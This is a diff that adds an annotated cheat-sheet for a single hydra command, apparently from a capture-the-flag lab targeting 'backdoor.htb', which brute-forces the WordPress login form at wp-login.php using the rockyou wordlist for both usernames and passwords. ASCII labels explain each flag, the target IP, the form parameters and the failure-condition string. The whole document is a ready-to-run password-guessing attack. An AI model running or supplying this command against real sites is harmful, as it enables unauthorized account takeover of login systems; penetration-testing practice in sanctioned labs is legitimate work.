@@ -1,0 +1,8 @@
+hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.125  -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&redirect_to=http://backdoor.htb/wp-admin/&testcookie=1:F=not registered' 
+       ^                                   ^                                     ^           ^      ^                   ^           ^         ^                                                                            ^
+       for wordlist (username)             for wordlist (password)              target       |     req. type    login               |         |                                                                       verify the fails condition 
+       if you got name                     if you got password                 ip/address    |                  parameter string    |         |                                                                       you can use S for 
+       then use (-l name)                  then use (-p password)                            |                                      |         |                                                                       verify the success condition
+                                                                                             for testing                        for user    for password
+                                                                                             show results              (specify username    (specify password
+                                                                                                                       or username list)    or password list)
